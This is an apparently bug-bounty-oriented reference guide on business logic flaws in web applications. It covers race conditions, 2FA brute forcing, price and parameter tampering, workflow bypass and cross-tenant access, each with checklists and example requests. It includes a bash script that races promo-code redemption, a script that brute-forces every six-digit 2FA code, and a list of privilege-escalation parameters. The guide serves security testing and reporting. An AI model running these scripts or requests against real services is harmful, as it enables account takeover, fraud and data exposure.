# Business Logic Flaw Patterns

> **Definition**: Vulnerabilities in application workflow/business rules, not technical implementation
> **Difficulty**: High — Requires understanding of business context
> **Detection**: Manual analysis + creative thinking
> **Success Rate**: 10-30% depending on program maturity

---

## Overview

**What Makes Business Logic Different**:
- No CVE database (each app is unique)
- No automated scanners (requires context understanding)
- High impact (often bypasses all technical controls)
- Requires domain knowledge (payments, auth, workflows)

**Key Insight**: Code works as designed, but design itself is flawed.

---

## Pattern 1: State Machine Bypass

### Description
Application uses state transitions (PENDING → VERIFIED → ACTIVE) but fails to enforce privilege differences between states.

### Real-World Example (Uber)
```
Email change flow:
1. User submits new email → State: PENDING
2. User clicks verification link → State: VERIFIED

Flaw: PENDING state already has same privileges as VERIFIED
→ Attacker can use unverified email immediately
```

### Detection Method
1. Identify state-based workflows (verification, approval, onboarding)
2. Map states: Draft, Pending, Approved, Active, Suspended
3. Test each state for privilege parity
4. Check if "pending" operations already grant access

### Testing Checklist
- [ ] After initiating state change, check what operations are allowed
- [ ] Test if rollback is possible (cancel verification, keep access)
- [ ] Test if state can be skipped entirely (go from NEW → ACTIVE directly)
- [ ] Check if expired states (EXPIRED, REVOKED) still work

### Example Tests
```bash
# Email change example
1. POST /api/account/change-email {"newEmail": "attacker@example.com"}
2. Check response: Does it return new session? Can you login with new email before verification?
3. Do NOT click verification link
4. Test: Can you still access account? Reset password? Receive 2FA codes?

# Result: If YES to any, state machine bypass confirmed
```

### CVSS
**Medium-High**: 6.0-8.0 depending on operation

---

## Pattern 2: Race Conditions

### Description
Concurrent requests exploit timing windows in critical operations (payment, inventory, promo codes).

### Real-World Example (Common)
```
Promo code "SAVE50" is single-use:
1. User applies code → Server checks validity → Deducts from inventory
2. Window between check and deduction: ~100-500ms
3. Send 10 parallel requests → All pass validity check → All get discount
```

### Detection Method
1. Identify operations with resource constraints (limited use, inventory)
2. Send parallel requests (5-20 simultaneous)
3. Check if constraint was violated (used promo 10 times)

### Testing Checklist
- [ ] Promo code redemption (single-use codes used multiple times)
- [ ] Payment processing (double-spend, negative balance)
- [ ] Inventory purchase (buy more than available stock)
- [ ] Referral bonuses (claim same referral multiple times)
- [ ] Voting/likes (vote multiple times)

### Example Script
```bash
#!/bin/bash
# race-condition-tester.sh

ENDPOINT="https://api.target.com/apply-promo"
PROMO_CODE="SAVE50"
COOKIE="session=abc123..."

# Send 10 parallel requests
for i in {1..10}; do
  curl -s -b "$COOKIE" -X POST "$ENDPOINT" \
    -d "{\"promoCode\": \"$PROMO_CODE\"}" &
done

wait

echo "Check account balance - if discount applied >1 time, race condition confirmed"
```

### CVSS
**Medium**: 5.0-7.0 (financial impact increases severity)

---

## Pattern 3: Error Message Enumeration

### Description
Error messages reveal information that enables enumeration or account takeover.

### Real-World Example (Uber Phase 7)
```
Promo code application:
- Valid expired code: "This promo code has expired"
- Invalid code: "Invalid promo code"

Difference reveals code validity → Brute force valid codes
```

### Detection Method
1. Test operation with various invalid inputs
2. Document exact error messages for each case
3. Look for distinguishable patterns

### Common Scenarios

#### Scenario A: Account Enumeration
```
Login with email: "existing@example.com" + wrong password
→ "Invalid password"

Login with email: "nonexistent@example.com" + any password
→ "Account not found"

Flaw: Can enumerate registered emails
```

#### Scenario B: Reset Token Validation
```
POST /reset-password {"token": "valid-expired-token"}
→ "Reset token has expired"

POST /reset-password {"token": "invalid-random-token"}
→ "Invalid reset token"

Flaw: Can brute force valid tokens (even if expired)
```

#### Scenario C: Payment Card Validation
```
Add card: "4111111111111111" (Visa format)
→ "Card declined by issuer"

Add card: "1234567890123456" (invalid format)
→ "Invalid card number"

Flaw: Can validate stolen card formats before attempting fraud
```

### Testing Checklist
- [ ] Login (email enumeration)
- [ ] Password reset (token validity)
- [ ] Promo codes (valid vs invalid vs expired)
- [ ] Payment cards (valid format vs declined)
- [ ] 2FA codes (rate limiting, attempt counting)

### CVSS
**Low-Medium**: 4.0-6.0 (information disclosure)

---

## Pattern 4: Price Manipulation

### Description
Client-side price calculation allows attacker to modify totals.

### Real-World Example
```
Checkout flow:
1. Add items to cart → Client calculates total
2. Submit order with total in request body
3. Server doesn't recalculate, trusts client

Flaw: Attacker modifies price before submission
```

### Detection Method
1. Add item to cart, inspect checkout request
2. Look for price in request body (not just item IDs)
3. Modify price (reduce to $0.01)
4. Submit order, check if accepted

### Testing Checklist
- [ ] Checkout total sent from client
- [ ] Discount percentage/amount modifiable
- [ ] Quantity * price calculated client-side
- [ ] Shipping cost editable
- [ ] Tax calculation bypassable

### Example
```http
POST /api/checkout HTTP/1.1
Cookie: session=abc123
Content-Type: application/json

{
  "items": [
    {"id": "product-123", "quantity": 1}
  ],
  "total": 0.01,  ← Modified from $99.99
  "currency": "USD"
}
```

### CVSS
**High**: 7.0-8.5 (direct financial fraud)

---

## Pattern 5: Multi-Tenant Data Leakage

### Description
Business/organization accounts leak data across tenant boundaries.

### Real-World Example
```
Business portal: business.uber.com
- Account A: Organization "Company A"
- Account B: Organization "Company B"

Request: GET /api/organizations/[company-a-id]/employees
Using: Company B's session

Flaw: Server checks authentication but not tenant ownership
→ Company B can see Company A's employee list
```

### Detection Method
1. Create two accounts in different organizations
2. Extract org_id from Account A (URLs, API responses)
3. Use Account B session to access Account A resources

### Testing Checklist
- [ ] Organization/team member lists
- [ ] Billing information
- [ ] Project/document listings
- [ ] API keys and secrets
- [ ] Usage analytics/reports

### Example
```bash
# Account A (Org ID: org-123)
GET /api/organizations/org-123/users
→ Returns 50 employees

# Account B (Org ID: org-456)
GET /api/organizations/org-123/users  # ← Using org-123 ID
Using: Account B session

# Expected: 403 Forbidden
# Vulnerable: Returns Company A's employee list
```

### CVSS
**High**: 7.5-8.5 (mass data exposure)

---

## Pattern 6: Workflow Bypass

### Description
Multi-step processes allow skipping required steps.

### Real-World Example
```
KYC (Know Your Customer) verification:
Step 1: Upload ID → /api/kyc/upload-id
Step 2: Selfie verification → /api/kyc/upload-selfie
Step 3: Admin approval → /api/kyc/approve (admin only)
Step 4: Access granted → /api/kyc/complete

Flaw: Step 4 doesn't verify steps 1-3 completed
→ Direct call to /api/kyc/complete bypasses verification
```

### Detection Method
1. Map all steps in workflow (create account, verify email, KYC, etc.)
2. Capture request for final step
3. Replay final step without completing prior steps
4. Check if operation succeeds

### Testing Checklist
- [ ] Account verification workflows
- [ ] Payment authorization (3D Secure bypass)
- [ ] Multi-step forms (wizard-style UIs)
- [ ] Approval workflows (skip manager approval)

### Example
```bash
# Normal flow
POST /api/account/create
POST /api/account/verify-email
POST /api/account/verify-phone
POST /api/account/kyc-upload
POST /api/account/activate  # ← Final step

# Bypass attempt
POST /api/account/create
POST /api/account/activate  # ← Skip all verification steps

# If successful: Workflow bypass confirmed
```

### CVSS
**Medium-High**: 6.0-8.0 depending on bypassed control

---

## Pattern 7: Parameter Tampering

### Description
Hidden or unexpected parameters change application behavior.

### Real-World Example
```
Standard request:
POST /api/checkout
{
  "items": [...],
  "total": 99.99
}

Modified request:
POST /api/checkout
{
  "items": [...],
  "total": 99.99,
  "isAdmin": true,  ← Added parameter
  "discount": 100   ← Added parameter
}

Flaw: Server processes unexpected parameters without validation
```

### Detection Method
1. Capture normal request
2. Add common parameter names (isAdmin, role, discount, debug)
3. Check if behavior changes

### Common Parameter Names to Test
```json
{
  "isAdmin": true,
  "admin": true,
  "role": "admin",
  "privilege": "admin",
  "discount": 100,
  "price": 0,
  "debug": true,
  "test_mode": true,
  "skip_verification": true,
  "bypass_auth": true
}
```

### CVSS
**Varies**: 4.0-9.0 depending on what's bypassed

---

## Pattern 8: Insufficient Rate Limiting

### Description
Critical operations lack rate limiting, enabling brute force or resource exhaustion.

### Real-World Example
```
Password reset: No rate limit
→ Attacker sends 10,000 reset emails → Email bombing
→ Attacker brute forces reset tokens

2FA verification: No rate limit
→ Attacker brute forces 6-digit code (1M attempts = guaranteed success)
```

### Detection Method
1. Identify sensitive operations (login, 2FA, password reset)
2. Send 50-100 requests in rapid succession
3. Check if any are blocked (429 Too Many Requests)

### Testing Checklist
- [ ] Login attempts (credential stuffing)
- [ ] 2FA/OTP verification (brute force)
- [ ] Password reset (email bombing)
- [ ] Promo code redemption (mass claiming)
- [ ] API calls (resource exhaustion)

### Example Script
```bash
#!/bin/bash
# rate-limit-tester.sh

ENDPOINT="https://api.target.com/verify-2fa"
COOKIE="session=abc123"

for CODE in {000000..999999}; do
  RESPONSE=$(curl -s -w "%{http_code}" -b "$COOKIE" \
    -X POST "$ENDPOINT" \
    -d "{\"code\": \"$CODE\"}")
  
  HTTP_CODE="${RESPONSE: -3}"
  
  if [ "$HTTP_CODE" == "200" ]; then
    echo "SUCCESS: Code $CODE is valid"
    break
  elif [ "$HTTP_CODE" == "429" ]; then
    echo "Rate limited after $(( CODE )) attempts"
    break
  fi
done
```

### CVSS
**Medium-High**: 6.0-8.0 (enables other attacks)

---

## Testing Workflow

### Phase 1: Business Context Mapping
- [ ] Read app documentation (privacy policy, terms of service, help docs)
- [ ] Identify business rules (refund policy, promo rules, verification requirements)
- [ ] Map critical workflows (signup, payment, access control)

### Phase 2: Hypothesis Generation
For each workflow, ask:
- What constraints exist? (single-use, limited quantity, verification required)
- What would happen if I bypass a step?
- What would happen if I do this twice simultaneously?
- What would happen if I modify hidden parameters?

### Phase 3: Systematic Testing
1. Test each hypothesis
2. Document behavior (expected vs actual)
3. If unexpected behavior → Investigate further
4. If bypasses security control → Write PoC

---

## Reporting Template

```markdown
## Business Logic Flaw: [Pattern Name]

### Summary
[One sentence: what can attacker do?]

### Affected Workflow
[Which business process is flawed?]

### Root Cause
[Why does this happen? Design flaw, missing validation, etc.]

### Reproduction Steps
1. [Step by step]
2. [Include HTTP requests if relevant]
3. [Show expected vs actual behavior]

### Business Impact
[Financial loss? Data breach? Fraud? Reputational harm?]

### CVSS Score
[Calculate and explain]

### Recommended Fix
[How should the business logic be corrected?]
```

---

## Anti-Patterns

❌ **Testing without understanding** — Read docs first
❌ **Assuming logic bugs = technical bugs** — Different detection methods
❌ **Only testing happy path** — Test edge cases, error conditions
❌ **Giving up after no technical vulns** — Logic flaws often missed by others

---

## Success Metrics

| Metric | Target |
|--------|--------|
| Workflows analyzed | 5-10 per program |
| Hypotheses tested | 20-50 |
| True positives | 1-3 per program (10-30% success rate) |
| Time per workflow | 30-60 minutes |

---

## References

- **OWASP**: [Testing for Business Logic](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/README)
- **OWASP Top 10 2021**: A01:2021 – Broken Access Control
- **CWE-840**: Business Logic Errors

---

## Changelog

- **2025-12-06**: Created from Uber sprint patterns (email change, promo enum, state bypass)
- **Future**: Add GraphQL-specific business logic patterns, blockchain/DeFi patterns
